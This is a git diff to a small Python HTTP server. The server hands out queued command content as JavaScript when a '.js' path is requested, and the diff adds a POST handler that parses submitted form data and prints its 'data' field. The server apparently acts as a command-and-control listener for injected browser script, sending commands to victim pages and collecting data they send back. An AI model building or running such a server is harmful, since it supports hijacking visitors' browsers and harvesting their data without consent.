@@ -2,6 +2,7 @@
 from http.server import HTTPServer, BaseHTTPRequestHandler
 from threading import Thread, Event
 from time import time, sleep
+from urllib.parse import unquote
 
 import sys
 import random
@@ -25,16 +26,25 @@ class SimpleHandler(BaseHTTPRequestHandler):
         # Empty header
         self.send_response(200)
         self.end_headers()
-        
-
-
-        print(self.path[-3:])
         if self.path[-3:] == ".js" and not cmd_queue.is_empty():
             cmd_to_add = cmd_queue.pop()
-            print(cmd_to_add.content)
             self.wfile.write(cmd_to_add.content.encode())
         else:
             self.wfile.write(b"")
+
+    def do_POST(self):
+        self.send_response(200)
+        self.end_headers()
+        self.wfile.write(b"")
+        length = int(self.headers['content-length'])
+        data = unquote(self.rfile.read(length).decode("UTF-8")).split()
+        data_dict = dict()
+        for d in data:
+            var, value = d.split('=')
+            value = value.replace('+', '')
+            value = value.replace("'", '')
+            data_dict[var] = value
+        print(data_dict.get("data"))
 
 
 def run_server(stop_event, ip="0.0.0.0", port=80, server_class=HTTPServer, handler_class=SimpleHandler):
